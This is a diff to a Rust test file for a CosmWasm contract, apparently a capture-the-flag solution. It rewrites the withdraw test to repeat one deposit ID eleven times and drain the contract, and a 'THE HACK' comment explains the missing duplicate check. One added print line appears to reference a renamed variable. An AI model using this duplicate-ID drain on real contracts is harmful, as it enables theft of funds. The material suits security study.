@@ -41,10 +41,11 @@ pub mod tests {
         app = mint_tokens(
             app,
             contract_addr.to_string(),
-            MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10),
+            MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10), // 100_000
         );
 
         // mint funds to user
+        // 10_000
         app = mint_tokens(app, USER.to_string(), MINIMUM_DEPOSIT_AMOUNT);
 
         // deposit
@@ -59,8 +60,8 @@ pub mod tests {
         .unwrap();
 
         // verify no funds
-        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
-        assert_eq!(balance, Uint128::zero());
+        let balance_user = app.wrap().query_balance(USER, DENOM).unwrap().amount;
+        assert_eq!(balance_user, Uint128::zero());
 
         (app, contract_addr)
     }
@@ -78,6 +79,7 @@ pub mod tests {
 
     #[test]
     fn basic_flow() {
+        // instantiate app and contract addr
         let (mut app, contract_addr) = proper_instantiate();
 
         let sender = Addr::unchecked(USER);
@@ -97,12 +99,17 @@ pub mod tests {
         });
 
         // test withdraw
-        let msg = ExecuteMsg::Withdraw { ids: vec![1] };
+        // THE HACK: The contract will iterate over the IDs, summing the amount of each locked deposit.
+        // This sum is transferred to the user. Although we only have 1 deposit, nothing stops
+        // us from passing the ID of this deposit more than once. If we do this 10 times,
+        // we can drain the contract.
+        let msg = ExecuteMsg::Withdraw { ids: vec![1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1] };
         app.execute_contract(sender, contract_addr, &msg, &[])
             .unwrap();
 
         // verify funds received
-        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
-        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
+        let balance_user = app.wrap().query_balance(USER, DENOM).unwrap().amount;
+        eprintln!("Balance user: {}", balance);
+        assert_eq!(balance_user, MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10) + MINIMUM_DEPOSIT_AMOUNT);
     }
 }
